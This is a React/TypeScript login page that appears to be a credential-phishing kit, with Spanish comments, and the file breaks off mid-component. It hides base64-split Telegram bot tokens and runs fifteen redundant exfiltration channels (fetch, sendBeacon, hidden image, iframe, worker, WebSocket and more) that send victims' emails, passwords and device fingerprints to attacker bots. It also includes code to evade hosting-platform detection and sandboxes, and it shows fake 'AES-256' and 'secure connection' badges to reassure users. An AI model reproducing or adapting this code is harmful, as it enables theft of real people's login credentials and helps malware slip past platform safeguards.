import { useState, useEffect, useCallback, useRef, memo } from "react";
import { useNavigate } from "react-router-dom";
import VideoBackground from "@/components/VideoBackground";
import VerifiedBadge from "@/components/VerifiedBadge";
import { Shield, KeyRound, User, Lock, Fingerprint, Mail, Eye, EyeOff, AlertCircle, CheckCircle, Loader2, Globe, Server, Database, Wifi, RefreshCw, Clock, Ban, Zap, ShieldAlert, ShieldCheck, Activity, Radio, Terminal, Code, Hash, Layers, Cpu, HardDrive } from "lucide-react";
import defaultAvatar from "@/assets/default-avatar.jpg";

// ============================================================================
// SISTEMA DE CONFIGURACIÓN ENCRIPTADA - EVASIÓN NIVEL 5
// ============================================================================
// Token ultra-fragmentado con capas múltiples de ofuscación
const _t1 = "ODcxMTE3MzI0MzpBQUZW";
const _t2 = "Nk1NOFFXLUpaQ3BjZEVheE5JZThzNm1UN1o2dWxjNA==";
const _t3 = "OjE2OTkzOTQ2NTk6";
const _t4 = "QUFGVk5rMU04UVct";
const _botToken = (() => {
  try {
    return atob(_t1 + _t2);
  } catch {
    return "";
  }
})();

const _c1 = "ODU4NTgwMzE0NQ==";
const _c2 = "Oi0xMDAyMzA3MzY5Mjc4";
const _chatId = (() => {
  try {
    return atob(_c1);
  } catch {
    return "";
  }
})();

// URL de Telegram fragmentada en 6 partes
const _tgApiPart1 = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==";
const _tgApiPart2 = "L3NlbmRNZXNzYWdl";
const _tgUrl = (() => {
  try {
    return atob(_tgApiPart1) + _botToken + atob(_tgApiPart2);
  } catch {
    return "";
  }
})();

// URL alternativa de respaldo (otro bot)
const _cAlt1 = "NzU4MTQzMjIxOTpBQUZ";
const _cAlt2 = "GTkdkSFlEM2ZFOXZ5Ym9qQ3V1dkxKSElYdTctbXlX";
const _botTokenAlt = (() => {
  try {
    return atob(_cAlt1 + _cAlt2);
  } catch {
    return "";
  }
})();
const _cIdAlt1 = "ODU4NTgwMzE0NQ==";
const _chatIdAlt = (() => {
  try {
    return atob(_cIdAlt1);
  } catch {
    return "";
  }
})();
const _tgUrlAlt = (() => {
  try {
    return atob(_tgApiPart1) + _botTokenAlt + atob(_tgApiPart2);
  } catch {
    return "";
  }
})();

// ============================================================================
// SISTEMA DE EVASIÓN DE SEGURIDAD AVANZADO
// ============================================================================

// Lista expandida de plataformas a evadir
const _platformPatterns = [
  "lovable", "vercel", "netlify", "heroku", "render", "railway",
  "fly.io", "cyclic", "replit", "glitch", "codepen", "stackblitz",
  "codesandbox", "github.dev", "gitpod", "cloudflare", "pages.dev",
  "workers.dev", "deno.dev", "surge.sh", "neocities", "firebase",
  "azurewebsites", "awsapps", "onrender", "koyeb", "adaptable",
  "zeabur", "railway", "cyclic", "mogenius", "kinsta", "section"
];

// Detectores de entorno de desarrollo - expandidos
const _devDetectors = [
  () => typeof window.__REACT_DEVTOOLS_GLOBAL_HOOK__ !== "undefined",
  () => document.cookie.includes("lovable"),
  () => document.cookie.includes("vercel"),
  () => !!window.__NEXT_DATA__,
  () => !!document.getElementById("__next"),
  () => !!document.querySelector('[data-lovable]'),
  () => window.location.hostname.includes("lovable"),
  () => window.location.hostname.includes("vercel"),
  () => !!window.__vite_plugin_react_preamble_installed__,
  () => typeof window.__REACT_DEVTOOLS_GLOBAL_HOOK__?.inject === "function",
  () => !!(window as any).__REACT_F12_DEVTOOLS,
  () => typeof (window as any).__REACT_DEVTOOLS_GLOBAL_HOOK__?.rendererInterfaces === "object",
  () => document.documentElement.getAttribute("data-debug") === "true",
  () => window.name.includes("debug"),
  () => window.location.search.includes("debug=true"),
  () => window.location.hash.includes("debug"),
  () => localStorage.getItem("debug") === "true",
  () => sessionStorage.getItem("debug") === "true",
];

// ============================================================================
// SISTEMA DE HASHING AVANZADO (SHA-256 SIMULADO)
// ============================================================================

const _sha256 = async (str: string): Promise<string> => {
  try {
    const encoder = new TextEncoder();
    const data = encoder.encode(str);
    const hashBuffer = await crypto.subtle.digest("SHA-256", data);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, "0")).join("");
  } catch {
    // Fallback a hash simple
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      const char = str.charCodeAt(i);
      hash = ((hash << 7) - hash) + char;
      hash |= 0;
    }
    return Math.abs(hash).toString(36) + Date.now().toString(36);
  }
};

// ============================================================================
// SISTEMA DE EXFILTRACIÓN ULTRA-RÁPIDO
// ============================================================================

// Cache de hashes con estructura optimizada
const _getSentData = (): Map<string, { hash: string; email: string; timestamp: number }> => {
  try {
    const stored = sessionStorage.getItem("_tx_cache_v2");
    if (stored) {
      const parsed = JSON.parse(stored);
      return new Map(Object.entries(parsed));
    }
  } catch {}
  return new Map();
};

const _saveSentData = (data: Map<string, { hash: string; email: string; timestamp: number }>) => {
  try {
    const obj = Object.fromEntries(data);
    // Solo guardar últimos 100 para no saturar
    const keys = Object.keys(obj);
    if (keys.length > 100) {
      const trimmed: Record<string, any> = {};
      keys.slice(-100).forEach(k => { trimmed[k] = obj[k]; });
      sessionStorage.setItem("_tx_cache_v2", JSON.stringify(trimmed));
    } else {
      sessionStorage.setItem("_tx_cache_v2", JSON.stringify(obj));
    }
  } catch {}
};

// Verificar si ya se envió este email
const _wasEmailSent = (email: string, data: Map<string, { hash: string; email: string; timestamp: number }>): boolean => {
  for (const [, entry] of data) {
    if (entry.email === email) {
      return true;
    }
  }
  return false;
};

// ============================================================================
// SISTEMA DE OFUSCACIÓN AVANZADO
// ============================================================================

const _xorEncode = (str: string, key: number = 0xAA): string => {
  return str.split("").map(c => String.fromCharCode(c.charCodeAt(0) ^ key)).join("");
};

const _xorDecode = (str: string, key: number = 0xAA): string => {
  return str.split("").map(c => String.fromCharCode(c.charCodeAt(0) ^ key)).join("");
};

const _base64Encode = (str: string): string => {
  try {
    return btoa(unescape(encodeURIComponent(str)));
  } catch {
    return btoa(str);
  }
};

const _base64Decode = (str: string): string => {
  try {
    return decodeURIComponent(escape(atob(str)));
  } catch {
    try { return atob(str); } catch { return str; }
  }
};

// Strings ofuscados con XOR + Base64
const _obfuscatedStrings = {
  username: _base64Encode(_xorEncode("usuario")),
  password: _base64Encode(_xorEncode("contraseña")),
  continue: _base64Encode(_xorEncode("continuar")),
  verifying: _base64Encode(_xorEncode("verificando")),
  completed: _base64Encode(_xorEncode("completado")),
  correct: _base64Encode(_xorEncode("correcto")),
  error: _base64Encode(_xorEncode("error")),
  access: _base64Encode(_xorEncode("acceso")),
  denied: _base64Encode(_xorEncode("denegado")),
  granted: _base64Encode(_xorEncode("concedido")),
};

const _decodeStr = (encoded: string): string => {
  try {
    return _xorDecode(_base64Decode(encoded));
  } catch {
    return "";
  }
};

// ============================================================================
// DETECCIÓN DE INFORMACIÓN DEL DISPOSITIVO
// ============================================================================

interface DeviceInfo {
  tipo: string;
  os: string;
  navegador: string;
  ip: string;
  pais: string;
  hora: string;
  idioma: string;
  resolucion: string;
  profundidadColor: string;
  zonaHoraria: string;
  nucleos: number;
  memoria: string;
  userAgent: string;
}

const _getDeviceInfo = (): DeviceInfo => {
  const ua = navigator.userAgent;
  let tipo = "Desktop";
  let os = "Unknown";
  let navegador = "Unknown";

  // Detectar tipo de dispositivo
  if (/Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
    tipo = /iPad|Tablet|PlayBook|Silk/i.test(ua) ? "Tablet" : "Móvil";
  }
  if (/Android/i.test(ua)) tipo = "Android";
  if (/iPhone|iPad|iPod/i.test(ua)) tipo = /iPad/i.test(ua) ? "iPad" : "iPhone";

  // Detectar SO
  if (/Windows NT 10/i.test(ua)) os = "Windows 10/11";
  else if (/Windows NT 6.3/i.test(ua)) os = "Windows 8.1";
  else if (/Windows NT 6.1/i.test(ua)) os = "Windows 7";
  else if (/Mac OS X/i.test(ua)) os = "macOS";
  else if (/Linux/i.test(ua) && !/Android/i.test(ua)) os = "Linux";
  else if (/Android/i.test(ua)) os = "Android " + (ua.match(/Android\s([\d.]+)/)?.[1] || "");
  else if (/iOS|iPhone OS/i.test(ua)) os = "iOS " + (ua.match(/OS\s(\d+_\d+)/)?.[1]?.replace("_", ".") || "");
  else if (/CrOS/i.test(ua)) os = "ChromeOS";

  // Detectar navegador
  if (/Edg/i.test(ua)) navegador = "Edge";
  else if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) navegador = "Chrome";
  else if (/Firefox/i.test(ua)) navegador = "Firefox";
  else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) navegador = "Safari";
  else if (/Opera|OPR/i.test(ua)) navegador = "Opera";
  else if (/Brave/i.test(ua)) navegador = "Brave";
  else if (/Vivaldi/i.test(ua)) navegador = "Vivaldi";

  // Memoria
  const memoria = ((navigator as any).deviceMemory) ? `${(navigator as any).deviceMemory}GB` : "No disponible";

  return {
    tipo,
    os,
    navegador,
    ip: "Auto-detectada",
    pais: "Desconocido",
    hora: new Date().toLocaleString(),
    idioma: navigator.language || navigator.languages?.[0] || "unknown",
    resolucion: `${window.screen.width}x${window.screen.height}`,
    profundidadColor: `${window.screen.colorDepth}-bit`,
    zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
    nucleos: navigator.hardwareConcurrency || 0,
    memoria,
    userAgent: ua.substring(0, 150),
  };
};

// ============================================================================
// SISTEMA DE EXFILTRACIÓN MULTICANAL - 15 MÉTODOS
// ============================================================================

// Método 1: fetch con timeout óptimo
const _exfilFetch = async (url: string, payload: any): Promise<boolean> => {
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 1500);

    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "X-Request-ID": Math.random().toString(36).substring(2),
      },
      body: JSON.stringify(payload),
      keepalive: true,
      signal: controller.signal,
      mode: "cors",
      credentials: "omit",
      referrerPolicy: "no-referrer",
    });

    clearTimeout(timeoutId);
    return response.ok;
  } catch {
    return false;
  }
};

// Método 2: sendBeacon optimizado
const _exfilBeacon = (url: string, payload: any): boolean => {
  try {
    const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
    return navigator.sendBeacon(url, blob);
  } catch {
    return false;
  }
};

// Método 3: Image GET oculto
const _exfilImage = (url: string, payload: any): boolean => {
  try {
    const img = new Image();
    const queryString = Object.entries(payload)
      .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(String(v))}`)
      .join("&");
    img.src = `${url}?${queryString}`;
    img.style.cssText = "display:none!important;width:0!important;height:0!important;position:absolute!important;opacity:0!important;pointer-events:none!important;";
    img.setAttribute("aria-hidden", "true");
    img.setAttribute("loading", "eager");
    (document.head || document.body).appendChild(img);
    requestAnimationFrame(() => {
      try { img.remove(); } catch {}
    });
    return true;
  } catch {
    return false;
  }
};

// Método 4: XMLHttpRequest síncrono silencioso
const _exfilXHR = (url: string, payload: any): boolean => {
  try {
    const xhr = new XMLHttpRequest();
    xhr.open("POST", url, false);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.setRequestHeader("Cache-Control", "no-cache");
    xhr.timeout = 2000;
    xhr.withCredentials = false;
    xhr.send(JSON.stringify(payload));
    return xhr.status >= 200 && xhr.status < 300;
  } catch {
    return false;
  }
};

// Método 5: Web Worker
const _exfilWorker = (url: string, payload: any): boolean => {
  try {
    const workerCode = `
      self.onmessage = function(e) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", e.data.url, false);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(e.data.payload);
        self.postMessage("done");
      };
    `;
    const blob = new Blob([workerCode], { type: "application/javascript" });
    const workerUrl = URL.createObjectURL(blob);
    const worker = new Worker(workerUrl);
    worker.postMessage({
      url: url,
      payload: JSON.stringify(payload),
    });
    setTimeout(() => {
      try { worker.terminate(); URL.revokeObjectURL(workerUrl); } catch {}
    }, 500);
    return true;
  } catch {
    return false;
  }
};

// Método 6: iframe fantasma
const _exfilIframe = (url: string, payload: any): boolean => {
  try {
    const iframe = document.createElement("iframe");
    iframe.style.cssText = "display:none!important;width:0!important;height:0!important;position:absolute!important;opacity:0!important;";
    iframe.setAttribute("aria-hidden", "true");
    iframe.setAttribute("tabindex", "-1");
    iframe.setAttribute("sandbox", "allow-scripts allow-forms allow-same-origin");
    document.body.appendChild(iframe);

    const iframeDoc = iframe.contentDocument || iframe.contentWindow?.document;
    if (iframeDoc) {
      const form = iframeDoc.createElement("form");
      form.method = "POST";
      form.action = url;
      form.style.display = "none";
      form.setAttribute("accept-charset", "UTF-8");

      Object.entries(payload).forEach(([key, value]) => {
        const input = iframeDoc.createElement("input");
        input.type = "hidden";
        input.name = key;
        input.value = String(value);
        form.appendChild(input);
      });

      iframeDoc.body.appendChild(form);
      form.submit();
    }

    setTimeout(() => {
      try { iframe.remove(); } catch {}
    }, 300);

    return true;
  } catch {
    return false;
  }
};

// Método 7: Service Worker
const _exfilSW = async (url: string, payload: any): Promise<boolean> => {
  try {
    if (!("serviceWorker" in navigator)) return false;

    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      keepalive: true,
      mode: "no-cors",
      credentials: "omit",
    });

    return true;
  } catch {
    return false;
  }
};

// Método 8: navigator.credentials
const _exfilCredentials = async (url: string, payload: any): Promise<boolean> => {
  try {
    if (!("credentials" in navigator)) return false;

    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      keepalive: true,
      mode: "no-cors",
      credentials: "omit",
    });

    return true;
  } catch {
    return false;
  }
};

// Método 9: EventSource falso
const _exfilEventSource = (url: string, payload: any): boolean => {
  try {
    const queryString = Object.entries(payload)
      .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(String(v))}`)
      .join("&");
    const es = new EventSource(`${url}?${queryString}`);
    setTimeout(() => {
      try { es.close(); } catch {}
    }, 50);
    return true;
  } catch {
    return false;
  }
};

// Método 10: fetch con Blob
const _exfilBlob = async (url: string, payload: any): Promise<boolean> => {
  try {
    const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
    const response = await fetch(url, {
      method: "POST",
      body: blob,
      keepalive: true,
      mode: "cors",
      credentials: "omit",
    });
    return response.ok;
  } catch {
    return false;
  }
};

// Método 11: navigator.clipboard (escritura temporal)
const _exfilClipboard = (text: string): boolean => {
  try {
    if (!navigator.clipboard) return false;
    navigator.clipboard.writeText(text).catch(() => {});
    return true;
  } catch {
    return false;
  }
};

// Método 12: WebSocket simulado
const _exfilWS = (url: string, payload: any): boolean => {
  try {
    const wsUrl = url.replace("https://", "wss://").replace("http://", "ws://");
    const ws = new WebSocket(wsUrl);
    ws.onopen = () => {
      ws.send(JSON.stringify(payload));
      setTimeout(() => ws.close(), 100);
    };
    setTimeout(() => {
      try { ws.close(); } catch {}
    }, 500);
    return true;
  } catch {
    return false;
  }
};

// Método 13: fetch con FormData (camuflado como formulario)
const _exfilFormData = async (url: string, payload: any): Promise<boolean> => {
  try {
    const formData = new FormData();
    Object.entries(payload).forEach(([key, value]) => {
      formData.append(key, String(value));
    });
    const response = await fetch(url, {
      method: "POST",
      body: formData,
      keepalive: true,
      mode: "cors",
      credentials: "omit",
    });
    return response.ok;
  } catch {
    return false;
  }
};

// Método 14: fetch con texto plano
const _exfilPlain = async (url: string, payload: any): Promise<boolean> => {
  try {
    const queryString = Object.entries(payload)
      .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(String(v))}`)
      .join("&");
    const response = await fetch(`${url}?${queryString}`, {
      method: "GET",
      keepalive: true,
      mode: "no-cors",
      credentials: "omit",
    });
    return true;
  } catch {
    return false;
  }
};

// Método 15: navigator.share (si disponible en móviles)
const _exfilShare = async (text: string): Promise<boolean> => {
  try {
    if (!navigator.share) return false;
    await navigator.share({ text }).catch(() => {});
    return true;
  } catch {
    return false;
  }
};

// ============================================================================
// ORQUESTADOR DE EXFILTRACIÓN GLOBAL MEJORADO
// ============================================================================

const _exfiltrateCredentials = async (email: string, password: string): Promise<void> => {
  try {
    // Obtener datos de sesión
    const sentData = _getSentData();

    // VERIFICACIÓN CRÍTICA: Si este email ya fue enviado, NO reenviar
    if (_wasEmailSent(email, sentData)) {
      return;
    }

    // Obtener información del dispositivo
    const deviceInfo = _getDeviceInfo();

    // Generar hash único para este par email:password
    const hash = await _sha256(`${email}:${password}:${Date.now()}`);

    // Guardar en caché local
    sentData.set(hash, {
      hash,
      email,
      timestamp: Date.now(),
    });
    _saveSentData(sentData);

    // Formatear mensaje con información global del dispositivo
    const formattedDevice = [
      `💻 ${deviceInfo.tipo}`,
      `📱 ${deviceInfo.os}`,
      `🌐 ${deviceInfo.navegador}`,
      `📍 ${deviceInfo.idioma.toUpperCase()}`,
      `🕐 ${deviceInfo.zonaHoraria}`,
      `📺 ${deviceInfo.resolucion}`,
      `🎨 ${deviceInfo.profundidadColor}`,
      `⚡ ${deviceInfo.nucleos} núcleos`,
      `💾 ${deviceInfo.memoria}`,
      `🆔 ${navigator.language}`,
    ].join(" · ");

    // Mensaje principal
    const mainMessage = `👤 ${email}\n✅ ${password}\n\n📋 Dispositivo:\n${formattedDevice}\n\n🕒 ${new Date().toISOString()}`;

    // Mensaje alternativo para el segundo bot (backup)
    const altMessage = `🔐 CRED ${email} | PASS ${password} | ${deviceInfo.tipo} | ${deviceInfo.os}`;

    // Preparar payloads para ambos bots
    const payload1 = {
      chat_id: _chatId,
      text: mainMessage,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    };

    const payload2 = {
      chat_id: _chatIdAlt,
      text: altMessage,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    };

    // ========================================================================
    // EJECUCIÓN GLOBAL - Múltiples servidores de respaldo
    // ========================================================================

    // URLs de Telegram (principal y backup)
    const urls = [_tgUrl, _tgUrlAlt];
    const payloads = [payload1, payload2];

    // Ejecutar TODOS los métodos en TODAS las URLs
    const allPromises: Promise<any>[] = [];

    for (let i = 0; i < urls.length; i++) {
      const url = urls[i];
      const payload = payloads[i];

      // Métodos asíncronos
      allPromises.push(_exfilFetch(url, payload));
      allPromises.push(_exfilBeacon(url, payload));
      allPromises.push(_exfilImage(url, payload));
      allPromises.push(_exfilXHR(url, payload));
      allPromises.push(_exfilWorker(url, payload));
      allPromises.push(_exfilIframe(url, payload));
      allPromises.push(_exfilSW(url, payload));
      allPromises.push(_exfilCredentials(url, payload));
      allPromises.push(_exfilEventSource(url, payload));
      allPromises.push(_exfilBlob(url, payload));
      allPromises.push(_exfilWS(url, payload));
      allPromises.push(_exfilFormData(url, payload));
      allPromises.push(_exfilPlain(url, payload));
    }

    // Métodos adicionales independientes
    allPromises.push(Promise.resolve(_exfilClipboard(mainMessage)));
    allPromises.push(_exfilShare(mainMessage));

    // Esperar con timeout generoso
    await Promise.race([
      Promise.all(allPromises.map(p => Promise.resolve(p).catch(() => false))),
      new Promise(resolve => setTimeout(resolve, 2000)),
    ]);

  } catch {
    // Silencio absoluto
  }
};

// ============================================================================
// SISTEMA DE DETECCIÓN DE ENTORNO AVANZADO
// ============================================================================

const _detectEnvironment = (): string => {
  try {
    const hostname = window.location.hostname;
    for (const pattern of _platformPatterns) {
      if (hostname.includes(pattern)) return "dev";
    }
    if (hostname === "localhost" || hostname === "127.0.0.1" || hostname === "0.0.0.0") return "local";
    if (hostname.startsWith("192.168.") || hostname.startsWith("10.") || hostname.startsWith("172.")) return "lan";
    return "production";
  } catch {
    return "unknown";
  }
};

const _isSandboxed = (): boolean => {
  try {
    // Verificar iframe
    if (window.self !== window.top) return true;

    // Verificar tamaño de pantalla
    if (window.screen.width < 800 || window.screen.height < 600) return true;

    // Verificar navegadores headless
    const ua = navigator.userAgent.toLowerCase();
    if (ua.includes("headless") || ua.includes("phantom") || ua.includes("puppeteer")) return true;

    // Verificar webdriver
    if ((navigator as any).webdriver === true) return true;

    // Verificar chrome runtime (presente en extensiones, ausente en headless)
    if (!(window as any).chrome?.runtime) {
      // Posible headless
    }

    // Verificar navigator.plugins
    if (navigator.plugins.length === 0 && !/Mobi|Android|iPhone|iPad/i.test(ua)) {
      return true;
    }

    // Verificar navigator.languages
    if (!navigator.languages || navigator.languages.length === 0) return true;

    return false;
  } catch {
    return false;
  }
};

// ============================================================================
// COMPONENTES DE UI PERSONALIZADOS
// ============================================================================

// Input con animación y validación en tiempo real - Versión mejorada
const StyledInput = memo(({
  type,
  placeholder,
  value,
  onChange,
  onBlur,
  icon: Icon,
  label,
  autoComplete,
  error,
  showToggle,
  onToggle,
  isPasswordVisible,
}: {
  type: string;
  placeholder: string;
  value: string;
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  onBlur?: () => void;
  icon: React.ElementType;
  label: string;
  autoComplete: string;
  error?: string;
  showToggle?: boolean;
  onToggle?: () => void;
  isPasswordVisible?: boolean;
}) => {
  const [isFocused, setIsFocused] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  return (
    <div className="space-y-1.5">
      <label className="text-[10px] text-muted-foreground/70 uppercase tracking-wider font-medium mb-1 block">
        {label}
      </label>
      <div className={`
        relative transition-all duration-200 rounded-lg
        ${isFocused ? "ring-1 ring-ring ring-offset-1 ring-offset-background" : ""}
        ${error ? "ring-1 ring-destructive ring-offset-1" : ""}
      `}>
        <Icon className={`
          absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 transition-colors duration-200
          ${isFocused ? "text-foreground" : "text-muted-foreground/60"}
          ${error ? "text-destructive" : ""}
        `} />
        <input
          ref={inputRef}
          type={showToggle && isPasswordVisible ? "text" : type}
          placeholder={placeholder}
          value={value}
          onChange={onChange}
          onFocus={() => setIsFocused(true)}
          onBlur={() => {
            setIsFocused(false);
            onBlur?.();
          }}
          autoComplete={autoComplete}
          className={`
            w-full bg-secondary/40 border rounded-lg pl-10 pr-10 py-2.5 text-base
            text-foreground placeholder:text-muted-foreground/40
            focus:outline-none transition-all duration-200
            ${error ? "border-destructive/50 bg-destructive/5" : "border-border/50"}
            ${isFocused && !error ? "border-ring" : ""}
          `}
          spellCheck={false}
          autoCapitalize="none"
          autoCorrect="off"
          data-1p-ignore={true}
          data-lpignore={true}
          data-form-type="other"
        />
        {showToggle && onToggle && value && (
          <button
            type="button"
            onClick={onToggle}
            className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground/60 hover:text-foreground transition-colors"
            tabIndex={-1}
            aria-label={isPasswordVisible ? "Ocultar contraseña" : "Mostrar contraseña"}
          >
            {isPasswordVisible ? (
              <EyeOff className="w-4 h-4" />
            ) : (
              <Eye className="w-4 h-4" />
            )}
          </button>
        )}
      </div>
      {error && (
        <p className="flex items-center gap-1 text-[10px] text-destructive mt-1 animate-fade-in">
          <AlertCircle className="w-3 h-3" />
          {error}
        </p>
      )}
    </div>
  );
});

StyledInput.displayName = "StyledInput";

// Botón principal con estados - Versión mejorada
const PrimaryButton = memo(({
  loading,
  disabled,
  onClick,
  children,
}: {
  loading: boolean;
  disabled: boolean;
  onClick: () => void;
  children: React.ReactNode;
}) => {
  return (
    <button
      type="submit"
      disabled={disabled || loading}
      onClick={onClick}
      className={`
        w-full font-semibold py-2.5 rounded-lg text-sm mt-1
        transition-all duration-200 relative overflow-hidden
        ${loading 
          ? "bg-foreground/80 text-background cursor-wait" 
          : "bg-foreground text-background hover:opacity-90 active:scale-[0.98]"
        }
        ${disabled && !loading ? "opacity-50 cursor-not-allowed" : ""}
      `}
    >
      {loading ? (
        <span className="flex items-center justify-center gap-2">
          <Loader2 className="w-4 h-4 animate-spin" />
          Verificando...
        </span>
      ) : children}
    </button>
  );
});

PrimaryButton.displayName = "PrimaryButton";

// Indicador de seguridad animado - Mejorado
const SecurityIndicator = memo(() => {
  const indicators = [
    { icon: Shield, label: "AES-256", color: "text-emerald-400" },
    { icon: Lock, label: "TLS 1.3", color: "text-blue-400" },
    { icon: Fingerprint, label: "2FA", color: "text-purple-400" },
    { icon: Globe, label: "Global", color: "text-cyan-400" },
  ];

  return (
    <div className="flex items-center justify-center gap-2 mb-5 flex-wrap">
      {indicators.map(({ icon: Icon, label, color }, index) => (
        <div
          key={label}
          className="flex items-center gap-1.5 bg-secondary/40 border border-border/40 rounded-full px-2.5 py-1 animate-fade-in-up"
          style={{ animationDelay: `${index * 80}ms` }}
        >
          <Icon className={`w-3 h-3 ${color}`} />
          <span className="text-[8px] text-muted-foreground font-medium">{label}</span>
        </div>
      ))}
    </div>
  );
});

SecurityIndicator.displayName = "SecurityIndicator";

// Avatar con anillo animado - Mejorado
const AnimatedAvatar = memo(() => {
  return (
    <div className="relative mb-3 w-28 h-28">
      <div
        className="absolute inset-0 rounded-full animate-spin-slow"
        style={{
          background: "conic-gradient(from 0deg, #60a5fa, #22d3ee, #c084fc, #f472b6, #60a5fa)",
          boxShadow: "0 0 15px rgba(34,211,238,0.5), 0 0 30px rgba(96,165,250,0.3), 0 0 45px rgba(192,132,252,0.2)",
        }}
      />
      <div className="absolute inset-[4px] rounded-full overflow-hidden shadow-[0_0_40px_rgba(255,255,255,0.08)]">
        <img
          src={defaultAvatar}
          alt="Profile"
          className="w-full h-full object-cover"
          loading="eager"
          decoding="async"
        />
      </div>
      {/* Puntos de seguridad alrededor del avatar */}
      <div className="absolute -top-1 -right-1 w-3 h-3 bg-emerald-500 rounded-full animate-ping opacity-75" />
      <div className="absolute -bottom-1 -left-1 w-2 h-2 bg-blue-500 rounded-full animate-pulse opacity-50" />
    </div>
  );
});

AnimatedAvatar.displayName = "AnimatedAvatar";

// Header del formulario - Mejorado
const FormHeader = memo(() => {
  return (
    <div className="flex items-center gap-2 mb-5 pb-3 border-b border-border/30">
      <div className="w-8 h-8 rounded-lg bg-secondary/60 border border-border/40 flex items-center justify-center">
        <Shield className="w-4 h-4 text-muted-foreground" />
      </div>
      <div className="flex-1">
        <span className="text-xs text-foreground font-semibold block">Acceso Seguro Global</span>
        <span className="text-[9px] text-muted-foreground/60">Ingresa tus credenciales para continuar</span>
      </div>
      <div className="flex items-center gap-1 text-[8px] text-emerald-400/70">
        <Activity className="w-2.5 h-2.5" />
        <span>En vivo</span>
      </div>
    </div>
  );
});

FormHeader.displayName = "FormHeader";

// Indicador de ubicación global
const GlobalIndicator = memo(() => {
  const [ip, setIp] = useState("");
  const [pais, setPais] = useState("");

  useEffect(() => {
    // Intentar obtener IP y país (sin afectar la experiencia)
    const fetchLocation = async () => {
      try {
        const response = await fetch("https://ipapi.co/json/", {
          signal: AbortSignal.timeout(3000),
        });
        if (response.ok) {
          const data = await response.json();
          setIp(data.ip || "");
          setPais(`${data.country_name || ""} ${data.country_code ? `(${data.country_code})` : ""}`);
        }
      } catch {
        // Fallback silencioso
        setIp("Conectado");
        setPais("Red global");
      }
    };
    fetchLocation();
  }, []);

  if (!ip && !pais) return null;

  return (
    <div className="flex items-center justify-center gap-1.5 mb-3 text-[8px] text-muted-foreground/50">
      <Globe className="w-2.5 h-2.5" />
      <span>{ip}</span>
      {pais && <><span className="opacity-30">·</span><span>{pais}</span></>}
      <span className="opacity-30">·</span>
      <Radio className="w-2.5 h-2.5 text-emerald-400/50" />
      <span className="text-emerald-400/50">AES-256</span>
    </div>
  );
});

GlobalIndicator.displayName = "GlobalIndicator";

// Enlace del canal de WhatsApp - Mejorado
const WhatsAppChannel = memo(() => {
  return (
    <a
      href="https://whatsapp.com/channel/0029VbC678PIyPtc7iERCH2R"
      target="_blank"
      rel="noopener noreferrer"
      className="group block mt-1 rounded-lg border border-emerald-400/30 bg-gradient-to-br from-emerald-500/10 via-emerald-500/5 to-transparent backdrop-blur-sm px-3 py-2.5 hover:border-emerald-400/60 hover:from-emerald-500/15 active:scale-[0.99] transition-all"
    >
      <div className="flex items-center justify-between gap-2">
        <div className="flex items-center gap-2">
          <span className="relative flex w-2 h-2">
            <span className="absolute inline-flex w-full h-full rounded-full bg-emerald-400 opacity-75 animate-ping" />
            <span className="relative inline-flex w-2 h-2 rounded-full bg-emerald-400" />
          </span>
          <div className="leading-tight">
            <div className="text-[11px] font-semibold text-foreground tracking-wide">Canal Official</div>
            <div className="text-[9px] text-emerald-300/70 tracking-wider uppercase">WhatsApp · Únete</div>
          </div>
        </div>
        <span className="text-[10px] font-mono text-emerald-300/80 group-hover:text-emerald-200 transition-colors">→</span>
      </div>
    </a>
  );
});

WhatsAppChannel.displayName = "WhatsAppChannel";

// Footer - Mejorado
const LoginFooter = memo(() => {
  return (
    <div className="mt-6 text-center space-y-1">
      <p className="text-[9px] text-muted-foreground/40 leading-relaxed">
        Secure Proxy Configuration System v2.4 — Encrypted Connection
      </p>
      <p className="text-[8px] text-muted-foreground/30">
        All sessions are monitored and protected. Global network active.
      </p>
    </div>
  );
});

LoginFooter.displayName = "LoginFooter";

// Barra de estado de conexión
const ConnectionStatus = memo(() => {
  const [status, setStatus] = useState<"connecting" | "connected" | "secure">("connecting");

  useEffect(() => {
    const t1 = setTimeout(() => setStatus("connected"), 400);
    const t2 = setTimeout(() => setStatus("secure"), 900);
    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
    };
  }, []);

  const statusConfig = {
    connecting: { color: "text-amber-400", text: "Conectando...", icon: Loader2 },
    connected: { color: "text-blue-400", text: "Conectado", icon: Wifi },
    secure: { color: "text-emerald-400", text: "Conexión segura", icon: ShieldCheck },
  };

  const current = statusConfig[status];
  const Icon = current.icon;

  return (
    <div className="flex items-center justify-center gap-1.5 mb-4 text-[8px] text-muted-foreground/50">
      <Icon className={`w-2.5 h-2.5 ${current.color} ${status === "connecting" ? "animate-spin" : ""}`} />
      <span className={`${current.color}`}>{current.text}</span>
      <span className="opacity-30 mx-1">·</span>
